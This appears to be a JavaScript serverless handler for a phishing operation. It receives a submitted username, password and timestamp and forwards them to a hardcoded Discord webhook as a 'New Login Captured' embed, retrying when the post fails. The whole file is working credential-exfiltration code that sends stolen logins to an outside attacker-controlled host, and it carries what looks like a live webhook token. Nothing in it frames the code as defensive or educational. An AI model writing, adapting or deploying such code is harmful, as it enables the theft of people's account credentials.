module.exports = async (req, res) => {
  const discordWebhookUrl = "https://discord.com/api/webhooks/1408935972829401158/TMRXIF8bqJ7YzjXDGKGYi_4DeXgtPtI2JcJR_ecLP9FFyYq-fCC-u24tYVPQGnyx5Q8w";
  const maxRetries = 3;

  async function sendToDiscord(payload, retries = maxRetries) {
    try {
      const response = await fetch(discordWebhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: "New Login Captured",
            fields: [
              { name: "Username", value: payload.username, inline: true },
              { name: "Password", value: payload.password, inline: true },
              { name: "Timestamp", value: payload.timestamp, inline: false }
            ],
            color: 0x00b0ff
          }]
        })
      });
      if (!response.ok) throw new Error(`Discord webhook failed: ${response.status}`);
      return true;
    } catch (error) {
      console.error(`Discord webhook error (attempt ${maxRetries - retries + 1}): ${error.message}`);
      if (retries > 0) return await sendToDiscord(payload, retries - 1);
      return false;
    }
  }

  try {
    const { username, password, timestamp } = req.body;
    if (!username || !password || !timestamp) {
      console.error("Missing required fields:", req.body);
      return res.status(400).json({ error: "Missing required fields" });
    }

    const success = await sendToDiscord({ username, password, timestamp });
    if (success) {
      res.status(200).json({ success: true });
    } else {
      console.error("All Discord webhook retries failed");
      res.status(500).json({ error: "Failed to send to Discord" });
    }
  } catch (error) {
    console.error("Serverless function error:", error.message);
    res.status(500).json({ error: "Server error" });
  }
};
